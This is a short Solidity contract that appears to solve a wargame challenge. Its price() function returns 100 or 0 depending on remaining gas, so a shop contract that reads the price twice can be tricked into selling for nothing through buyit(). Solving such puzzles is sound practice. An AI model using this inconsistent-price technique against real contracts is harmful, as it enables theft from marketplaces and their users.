// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;
contract Buyer{
    address public add;
    constructor() public {
    }

    function price() public view returns(uint256){
        if (gasleft()%2 == 1){
            uint t=0; //3gas
            uint q=0;// 3gas
            return 100;//3gas
        }
        // the second call price() can return 0
        return 0;     
    }
    function buyit(address add) public {
        bytes memory data = abi.encodeWithSignature("buy()");
        (bool success, ) = add.call(data);
        require(success);
    }
}